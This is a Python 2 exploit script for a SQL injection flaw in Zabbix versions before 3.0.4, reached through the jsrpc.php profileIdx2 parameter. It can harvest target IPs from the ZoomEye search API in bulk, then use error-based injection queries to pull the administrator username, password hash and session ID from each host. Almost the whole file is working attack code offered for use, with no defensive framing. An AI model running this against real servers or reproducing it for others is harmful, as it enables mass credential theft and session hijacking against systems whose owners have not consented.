#!/usr/bin/env python 
# -*- coding: utf_8 -*- 
# Date: 2016/8/18 
# Created by 独自等待 
# Blog: http://www.waitalone.cn/

# author  : evilclay
# datetime: 20160330
# Blog: http://www.cnblogs.com/anka9080/p/ZoomEyeAPI.html


import urllib2 
import sys
import os
import re
import requests
import json

dork_data = u'Zabbix'
ip_list = []

def saveStrToFile(file,str):
    u'将字符串写入文件'
    with open(file,'w') as output:
        output.write(str)

def saveListToFile(file,list):
    u'将列表逐行写入文件'
    s = '\n'.join(list)
    with open(file,'w') as output:
        output.write(s)

def login():
    u'输入用户名密码 进行登录操作'
    user = raw_input(u'[-] input : username :')
    passwd = raw_input(u'[-] input : password :')
    data = {
        'username' : user,
        'password' : passwd
    }
    data_encoded = json.dumps(data)  # dumps 将 python 对象转换成 json 字符串
    try:
        r = requests.post(url = 'https://api.zoomeye.org/user/login',data = data_encoded)
        r_decoded = json.loads(r.text) # loads() 将 json 字符串转换成 python 对象
        # global access_token
        access_token = ''
        access_token = r_decoded['access_token']
        print access_token
        return access_token
    except Exception,e:
        print u'[-] info : username or password is wrong, please try again '
        sys.exit()

def zoomeye_find(access_token):
    u'使用zoomeye.org查找目标网站'
    page = 1
    #global access_token
    # with open('access_token.txt','r') as input:
    #    access_token = input.read()
    # 将 token 格式化并添加到 HTTP Header 中
    headers = {
        'Authorization' : 'JWT ' + access_token,
    }
    # print headers
    while(True):
        try:
            r = requests.get(url = 'https://api.zoomeye.org/host/search?query=' + dork_data + '&facets=app,os&page=' + str(page),headers = headers)
            r_decoded = json.loads(r.text)
            # print r_decoded
            # print r_decoded['total']
            for x in r_decoded['matches']:
                print x['ip']
                ip_list.append(x['ip'])
            print u'[-] info : count ' + str(page * 10)
        except Exception,e:
            # 若搜索请求超过 API 允许的最大条目限制 或者 全部搜索结束，则终止请求
            if str(e.message) == 'matches':
                print u'[-] info : account was break, excceeding the max limitations'
                break
            else:
                print  u'[-] info : ' + str(e.message)
        else:
            if page == 10:
                break
            page += 1

def deteck_Sql(): 
    u'检查是否存在SQL注入'
    payload ="jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=999'&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&mark_color=1"
    try:
        response = urllib2.urlopen(url + payload, timeout=10).read()
    except Exception, msg:
        print msg
    else:
        # print response
        key_reg = re.compile(r"INSERT\s*INTO\s*profiles")
        if key_reg.findall(response):
            return True


def sql_Inject(sql): 
    u'获取特定sql语句内容'
    results = ''
    payload =url +"jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2="+ urllib2.quote(sql)+"&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids[23297]=23297&action=showlatest&filter=&filter_task=&mark_color=1"
    try:
        response = urllib2.urlopen(payload, timeout=10).read()
    except Exception, msg:
        print msg
    else:
        result_reg = re.compile(r"Duplicate\s*entry\s*'~(.+?)~1")
        results = result_reg.findall(response)
    if results:
        return results[0]


if __name__ == '__main__': 
    #os.system(['clear', 'cls'][os.name == 'nt'])
    print u'+'+ '-' * 60 + '+'
    print u'\t\t Python Zabbix<3.0.4 SQL注入 Exploit'
    print u'\t\t Code BY：waitalone & evilclay & dr4'
    print u'\t\t Time：2016-09-05'
    print u'+'+ '-' * 60 + '+'

    if len(sys.argv) != 2:
        print u'[-] Usage : ' +os.path.basename(sys.argv[0]) + ' <URL> or zoomeye'
        print u'[-] Exp : ' +os.path.basename(sys.argv[0]) + ' http://www.foo.com/'
        print u'[-] Exp : ' +os.path.basename(sys.argv[0]) + ' zoomeye'
        sys.exit()
    
    if sys.argv[1] != 'zoomeye':
        ip_list.append(sys.argv[1])
    else:
        a_token = ''
        if not os.path.isfile('access_token.txt'):
            print '[-] info : access_token file is not exist, please login'
            a_token = login()
            saveStrToFile('access_token.txt',a_token)
        with open('access_token.txt','r') as input:
            a_token = input.read()
        zoomeye_find(a_token)
        saveListToFile('ip_list.txt',ip_list)

    x = 0
    for x in range(len(ip_list)):
        #url =sys.argv[1]
        url = 'http://'
        url += ip_list[x]
        # print u'[-] info : URL = '+url
        if url[-1] != '/':
            url += '/'
            passwd_sql = "(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select concat(name,0x3a,passwd) from users limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
            session_sql = "(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select sessionid from sessions limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
            if deteck_Sql():
                print u'[-] info : Zabbix 存在SQL注入漏洞! <' + url+ '>'
                print u'[-] info : 管理员 用户名密码：%s' %sql_Inject(passwd_sql)
                print u'[-] info : 管理员 Session_id：%s\n' % sql_Inject(session_sql)
            else:
                # print u'[-] info : Zabbix 不存在SQL注入漏洞!\n'
                continue

